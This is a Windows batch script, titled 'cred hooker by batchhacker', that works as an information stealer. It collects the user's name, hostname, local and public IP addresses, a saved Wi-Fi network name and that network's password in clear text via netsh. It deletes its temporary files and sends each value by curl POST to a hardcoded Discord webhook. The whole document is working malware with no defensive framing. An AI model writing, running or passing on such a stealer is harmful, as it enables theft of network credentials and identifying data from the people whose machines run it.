@echo off
title cred hooker by batchhacker 

:information
rem get information in this computer
echo ------------------------------------- > line1.txt 
curl https://ipinfo.io/ip > publicip.txt
echo %username% > username.txt
hostname > hostname.txt
ipconfig | find "IPv4" > ipv4.txt

for /f "tokens=2,3 delims=:" %%a in ( 'netsh wlan show profiles' ) do (
    set ssid=%%a > ssid.txt
)
netsh wlan show profile %ssid% key=clear | find "Key Content" > wifipass.txt

echo ------------------------------------- > line2.txt 

rem passage of variables 
set /p "line1=" < line1.txt
set /p "hostnamez=" < hostname.txt 
set /p "usernamez=" < username.txt
set /p "pubip=" < publicip.txt
set /p "ipv4=" < ipv4.txt
set /p "ssidz=" < ssid.txt
set /p "wifipasswd="< wifipass.txt
set /p "line2=" < line2.txt

rem server by transfering informations
set webhook="https://discordapp.com/api/webhooks/1288994255355772948/_y-tOeyzn0escJxZNuathSLEGDuWjZlzo_Q2BNA3tyAhWF2QJ5yK4X9SnQxIhnYsgqwy"

rem clean filez 
del line1.txt
del hostname.txt
del username.txt
del publicip.txt
del ipv4.txt
del ssid.txt
del wifipass.txt
del line2.txt

rem data transfer mode
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line1%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%hostnamez%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%usernamez%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%pubip%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ipv4%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ssidz%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipasswd%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
cmd /c timeout /t 0 > nul
